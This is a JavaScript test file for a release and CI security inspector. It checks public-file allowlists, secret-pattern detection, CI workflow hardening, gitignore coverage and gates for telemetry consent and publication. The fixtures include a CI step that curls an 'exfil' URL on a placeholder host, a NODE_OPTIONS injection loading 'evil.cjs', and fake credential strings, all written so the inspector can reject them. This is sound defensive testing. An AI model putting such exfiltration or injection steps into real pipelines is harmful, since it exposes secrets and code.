import assert from 'node:assert/strict';
import { createHash } from 'node:crypto';
import { readFileSync } from 'node:fs';
import test from 'node:test';
import { inspectSecurity } from '../security.mjs';
import { STAGING_CONTRACT } from '../../p6/staging.mjs';
import { FREE_STAGING_POLICY } from '../../p7/free-staging.mjs';

const digest = b => createHash('sha256').update(b).digest('hex');
const collector = readFileSync(new URL('../../../src/telemetry/collector.js', import.meta.url), 'utf8');
const localDryRun = readFileSync(new URL('../release-dry-run.mjs', import.meta.url), 'utf8');
const gitignore = ['assets/models_original/', 'assets/models_prepared/', 'assets/images/**/*.png',
  'node_modules/', 'tools/ops/telemetry.db*', 'tools/ops/backups/', 'tools/ops/scratch/',
  'tools/delivery/releases/', '.env', '.env.*', '*.pem', '*.key', '*.p12', '*.pfx'].join('\n');
const workflow = [
  'name: Synthetic fixture',
  'on:', '  pull_request:', 'permissions:', '  contents: read', 'jobs:', '  validate:',
  '    runs-on: ubuntu-latest', '    steps:',
  '      - uses: actions/checkout@v7', '        with:', '          persist-credentials: false',
  '      - uses: actions/setup-node@v7', '        with:', '          package-manager-cache: false',
  '      - run: node tools/p8/security.mjs --mode ci',
  '      - run: node tools/p8/check.mjs --mode native',
  '      - run: node tools/p5/check.mjs --mode native',
  '      - run: node tools/p6/check.mjs --mode native',
  '      - run: node tools/p7/check.mjs --mode native',
  '      # - run: npm publish', ''
].join('\n');
function fixture() {
  const publicFiles = new Map([
    ['/index.html', Buffer.from('<!doctype html><title>fixture</title>')],
    ['/src/telemetry/collector.js', Buffer.from(collector)],
    ['/src/app.js', Buffer.from('export const ok = true;\n')]
  ]);
  const files = [...publicFiles].map(([path, bytes]) =>
    ({ path, bytes: bytes.length, sha256: digest(bytes) })).sort((a, b) => a.path.localeCompare(b.path));
  return {
    manifest: { format: 'velance-static-release/1', files }, publicFiles,
    workflowFiles: [{ path: '.github/workflows/validate.yml', source: workflow }],
    gitignore, staging: structuredClone(STAGING_CONTRACT),
    freeStaging: structuredClone(FREE_STAGING_POLICY),
    rights: { localAudit: 'PASS_LOCAL', publicLaunch: 'NO_GO', g0LegalGate: 'BLOCKED',
      legalDistributionAuthorizedByAudit: false,
      registeredRights: { total: 96, legalSignaturesIndependentlyVerified: 0 } },
    consentSource: collector, consentBehaviorPassed: true, trackedFiles: [],
    releaseDryRunSource: localDryRun
  };
}
function check(mutate) {
  const input = fixture();
  mutate?.(input);
  return inspectSecurity(input);
}
function fail(expected, mutate) {
  const result = check(mutate);
  assert.equal(result.localSecurity, 'FAIL_CLOSED', JSON.stringify(result.violations));
  assert.equal(result.publicLaunch, 'NO_GO');
  assert.equal(result.cloudDeploymentAuthorized, false);
  assert.equal(result.automaticLicenseApproval, false);
  assert(result.violations.some(v => v.code === expected), JSON.stringify(result.violations));
}
function alterPublic(f, path, contents) {
  const bytes = Buffer.from(contents);
  f.publicFiles.set(path, bytes);
  const record = f.manifest.files.find(entry => entry.path === path);
  if (record) { record.bytes = bytes.length; record.sha256 = digest(bytes); }
  else f.manifest.files.push({ path, bytes: bytes.length, sha256: digest(bytes) });
}
function alterCi(f, replacement) { f.workflowFiles[0].source = replacement; }

test('synthetic snapshot/CI policy passes locally, never authorizes publication', () => {
  const report = check();
  assert.equal(report.localSecurity, 'PASS_LOCAL', JSON.stringify(report.violations));
  assert.equal(report.publicLaunch, 'NO_GO');
  assert.equal(report.automaticLicenseApproval, false);
  assert.equal(report.cloudDeploymentAuthorized, false);
  assert.equal(report.inspected.publicFiles, 3);
});

test('public allowlist, missing/mutated bytes and unlisted files reject exposures', () => {
  fail('PUBLIC_PATH_NOT_ALLOWED', f => alterPublic(f, '/tools/ops/telemetry.db', 'PRIVATE_DB'));
  fail('PUBLIC_PATH_NOT_ALLOWED', f => alterPublic(f, '/assets/images/demo/master.png', 'PNG_MASTER'));
  fail('RELEASE_CONTENT_INTEGRITY', f => f.publicFiles.set('/index.html', Buffer.from('tampered')));
  fail('DUPLICATE_RELEASE_PATH', f => f.manifest.files.push({ ...f.manifest.files[0] }));
  fail('UNLISTED_PUBLIC_FILE', f => f.publicFiles.set('/src/unknown.js', Buffer.from('export {}')));
});

test('live key and credential patterns are blocked in hashed public JS', () => {
  for (const [rule, secret] of [
    ['privateKeyMaterial', '-----BEGIN PRIVATE KEY-----\nabc'],
    ['githubToken', 'ghp_' + 'A'.repeat(38)],
    ['awsAccessKey', 'AKIA' + 'Q'.repeat(16)],
    ['stripeLiveSecret', 'sk_live_' + 'B'.repeat(32)],
    ['embeddedDatabaseCredentials', 'postgres://owner:secretValue@private.invalid/mydb']
  ]) fail('EMBEDDED_SECRET_' + rule, f => alterPublic(f, '/src/app.js', 'export const value = ' + JSON.stringify(secret) + ';'));
  fail('SUSPICIOUS_HARDCODED_CREDENTIAL', f =>
    alterPublic(f, '/src/app.js', "export const accessToken = 'veryLongCredentialValue1234';"));
});

test('CI disallows publishing, remote commands, unapproved actions and dangerous triggers', () => {
  fail('CI_COMMAND_UNREVIEWED', f => f.workflowFiles[0].source += '      - run: npm publish\n');
  fail('CI_COMMAND_UNREVIEWED', f => f.workflowFiles[0].source += '      - run: curl https://example.invalid/exfil\n');
  fail('CI_ACTION_UNREVIEWED', f => f.workflowFiles[0].source += '      - uses: vendor/deploy@v1\n');
  fail('DANGEROUS_CI_EVENT', f => alterCi(f, workflow.replace('  pull_request:', '  pull_request_target:')));
  fail('CI_TOKEN_PERMISSIONS', f => alterCi(f, workflow.replace('contents: read', 'contents: write')));
  fail('CI_REQUIRED_GATE_MISSING', f => alterCi(f, workflow.replace('node tools/p8/check.mjs --mode native',
    'node tools/p8/security.mjs --mode ci')));
  fail('CI_DANGEROUS_ENV', f => f.workflowFiles[0].source += '      - run: node tools/p8/security.mjs --mode ci\n        env:\n          NODE_OPTIONS: "--require ./evil.cjs"\n');
  fail('CI_CONTINUE_ON_ERROR', f => f.workflowFiles[0].source += '      - run: node tools/p8/security.mjs --mode ci\n        continue-on-error: true\n');
});

test('checkout privileges, node caching and unguarded self-hosted GPU fail closed', () => {
  fail('CI_CHECKOUT_PERSISTS_CREDENTIALS', f =>
    alterCi(f, workflow.replace('persist-credentials: false', 'persist-credentials: true')));
  fail('CI_NODE_CACHE_UNREVIEWED', f =>
    alterCi(f, workflow.replace('package-manager-cache: false', 'package-manager-cache: true')));
  fail('UNTRUSTED_SELF_HOSTED_RUNNER', f =>
    alterCi(f, workflow.replace('runs-on: ubuntu-latest', 'runs-on: [self-hosted, macOS]')));
});

test('legitimate manual GPU run, defaults.run mapping and comment-only publish are accepted', () => {
  const result = check(f => f.workflowFiles[0].source += [
    '  gpu:',
    '    needs: validate',
    "    if: github.event_name == 'workflow_dispatch' && inputs.gpu == true",
    '    runs-on: [self-hosted, macOS, ARM64, gpu]',
    '    defaults:', '      run:', '        shell: bash',
    '    steps:', '      - uses: actions/checkout@v7', '        with:',
    '          persist-credentials: false',
    '      - run: node tools/p7/browser_lazy.mjs', ''
  ].join('\n'));
  assert.equal(result.localSecurity, 'PASS_LOCAL', JSON.stringify(result.violations));
  fail('CI_GPU_BROWSER_NOT_MANUAL', f =>
    f.workflowFiles[0].source += '      - run: node tools/p7/browser_lazy.mjs\n');
  fail('UNTRUSTED_SELF_HOSTED_RUNNER', f => f.workflowFiles[0].source += [
    '  gpu:',
    "    if: github.event_name == 'workflow_dispatch' && inputs.gpu",
    '    runs-on: [self-hosted, macOS, ARM64, gpu]',
    '    steps:',
    '      - run: node tools/p7/browser_lazy.mjs', ''
  ].join('\n'));
});

test('gitignore protects secrets, assets and database; already tracked secrets remain forbidden', () => {
  fail('GITIGNORE_PROTECTION_MISSING', f => f.gitignore = gitignore.replace('.env.*', ''));
  fail('GITIGNORE_PROTECTION_MISSING', f => f.gitignore = gitignore.replace('*.pem', ''));
  fail('TRACKED_PRIVATE_ASSET', f => f.trackedFiles = ['.env.production']);
  fail('TRACKED_PRIVATE_ASSET', f => f.trackedFiles = ['tools/ops/telemetry.db-wal']);
  fail('TRACKED_PRIVATE_ASSET', f => f.trackedFiles = ['assets/models_original/private.glb']);
});

test('no automatic license approval, staging deployment or telemetry bypass', () => {
  fail('AUTOMATIC_LEGAL_APPROVAL_RISK', f => { f.rights.legalDistributionAuthorizedByAudit = true; });
  fail('AUTOMATIC_LEGAL_APPROVAL_RISK', f => { f.rights.publicLaunch = 'GO'; });
  fail('PUBLIC_STAGING_GATE_OPEN', f => { f.staging.deployEnabled = true; });
  fail('PUBLIC_STAGING_GATE_OPEN', f => { f.staging.edge.telemetry.enabled = true; });
  fail('FREE_STAGING_EXPOSURE', f => { f.freeStaging.cloud = true; });
  fail('FREE_STAGING_EXPOSURE', f => { f.freeStaging.upstream = 'http://127.0.0.1:9000'; });
  fail('TELEMETRY_OPT_IN_SOURCE_GUARD', f =>
    f.consentSource = collector.replace('let consentGranted = false;', 'let consentGranted = true;'));
  fail('TELEMETRY_OPT_IN_TEST_REQUIRED', f => { f.consentBehaviorPassed = false; });
  fail('CONSENT_BYPASS_TELEMETRY_POST', f =>
    alterPublic(f, '/src/app.js', "fetch('/api/telemetry', { method: 'POST' });"));
  fail('CI_RELEASE_DRY_RUN_SOURCE_CHANGED', f =>
    f.releaseDryRunSource += "\nfetch('https://example.invalid/');\n");
});

test('release dry-run must be explicitly opt-in via manual workflow_dispatch', () => {
  const safe = check(f => f.workflowFiles[0].source += [
    '      - name: Manual local dry-run',
    "        if: github.event_name == 'workflow_dispatch' && inputs.release_dry_run == true",
    '        run: node tools/p8/release-dry-run.mjs', ''
  ].join('\n'));
  assert.equal(safe.localSecurity, 'PASS_LOCAL', JSON.stringify(safe.violations));
  fail('UNGUARDED_RELEASE_DRY_RUN', f =>
    f.workflowFiles[0].source += '      - run: node tools/p8/release-dry-run.mjs\n');
});
